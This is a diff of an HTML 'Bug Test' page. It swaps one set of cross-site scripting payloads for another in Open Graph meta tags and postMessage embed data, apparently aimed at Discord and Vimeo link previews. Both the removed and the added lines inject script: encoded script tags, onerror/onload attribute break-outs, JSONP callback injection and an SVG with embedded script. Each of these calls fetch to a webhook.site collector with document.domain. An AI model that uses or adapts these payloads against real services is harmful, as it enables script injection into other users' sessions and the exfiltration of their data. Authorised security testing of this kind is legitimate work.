@@ -3,14 +3,14 @@
 <head>
     <meta charset="utf-8">
     <meta property="og:site_name" content="Vimeo">
-    <meta property="og:url" content="https://vimeo.com/403530213">
+    <meta property="og:url" content="https://vimeo.com/403530213&#x0022;&#x003e;&#x003c;script&#x003e;fetch(&#x0027;https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?&#x0027;+document.domain)&#x003c;/script&#x003e;">
     <meta property="og:type" content="video.other">
     <meta property="og:title" content="Please Die">
     <meta property="og:description" content="H4CK1NG 1S L1F3">
-    <meta property="og:image" content="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3E%3C![CDATA[fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?'+document.domain)]]%3E%3C/script%3E%3C/svg%3E">
-    <meta property="og:video" content="javascript:alert(1)">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213">
-    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213">
+    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d?inject=1&quot;onerror=&quot;fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?'+document.domain)">
+    <meta property="og:video" content="https://player.vimeo.com/video/403530213/config?callback=alert(1);//">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?inject=1&quot; onload=&quot;fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?'+document.domain)">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213/config.json#&quot;);fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?'+document.domain);//">
     <meta property="og:video:type" content="text/html">
     <title>Bug Test</title>
     <script src="https://player.vimeo.com/api/player.js"></script>
@@ -29,23 +29,6 @@
                     timestamp: new Date().toISOString()
                 });
 
-                // More complex SVG payload with CDATA and fetch
-                const svg = `<svg xmlns="http://www.w3.org/2000/svg">
-                    <defs>
-                        <style>
-                            @import url('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?css');
-                        </style>
-                    </defs>
-                    <foreignObject>
-                        <xhtml:script xmlns:xhtml="http://www.w3.org/1999/xhtml">
-                            <![CDATA[
-                                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?' + document.domain);
-                            ]]>
-                        </xhtml:script>
-                    </foreignObject>
-                    <image href="https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?img" />
-                </svg>`;
-
                 const frame = document.createElement('iframe');
                 frame.src = 'https://player.vimeo.com/video/403530213';
                 frame.width = '640';
@@ -62,10 +45,9 @@
                     window.parent.postMessage({
                         type: 'DISCORD_EMBED_LOADED',
                         data: {
-                            url: 'https://vimeo.com/403530213',
+                            url: 'https://vimeo.com/403530213/config?callback=fetch(`https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?${document.domain}`)//',
                             width: '640',
-                            height: '360',
-                            thumbnail_url: 'data:image/svg+xml,' + encodeURIComponent(svg)
+                            height: '360'
                         }
                     }, '*');
                 };
@@ -94,7 +76,7 @@
                     type: 'DISCORD_EMBED_UPDATE',
                     data: {
                         html: '',
-                        thumbnail_url: 'data:image/svg+xml,' + encodeURIComponent(svg)
+                        url: 'https://vimeo.com/403530213/config?callback=fetch(`https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?${document.domain}`)//'
                     }
                 }, '*');
             }
